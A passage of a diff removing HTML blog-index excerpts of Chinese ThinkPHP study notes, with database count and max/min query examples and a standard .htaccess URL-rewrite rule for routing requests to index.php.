-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; Db::name(&#39;user&#39;)-&gt;count(&#39;uid&#39;);</span><br><span class="line">uid如果不加，就是全查询</span><br></pre></td></tr></table></figure>
-
-<p>最大/小值</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; Db::name(&#39;user&#39;)-&gt;max&#x2F;min(&#39;price&#39;，可选参数);</span><br><span class="line">取值为bool，可以判断整型还是浮点型</span><br></pre></td></tr></table></figure>
-
-<p>平均值和总和同SQL</p> 
-      <a class="article-more-link" href="/2020/09/18/ThinkPHP-2/"
-        >阅读更多...</a
-      >
-       
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -761,21 +527,7 @@
   </div>
    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="ThinkPhP学习-第一天"><a href="#ThinkPhP学习-第一天" class="headerlink" title="ThinkPhP学习-第一天"></a>ThinkPhP学习-第一天</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>.htaceess</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">  Options +FollowSymlinks -Multiviews</span><br><span class="line">  RewriteEngine On</span><br><span class="line"></span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">  RewriteRule ^(.*)$ index.php [L,E=PATH_INFO:$<span class="number">1</span>]</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>
-
-<p>要改成这样，并且打开伪静态模块</p> 
-      <a class="article-more-link" href="/2020/09/17/URL%E8%A7%A3%E6%9E%90%E6%A8%A1%E5%BC%8F/"
-        >阅读更多...</a
-      >
-       
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
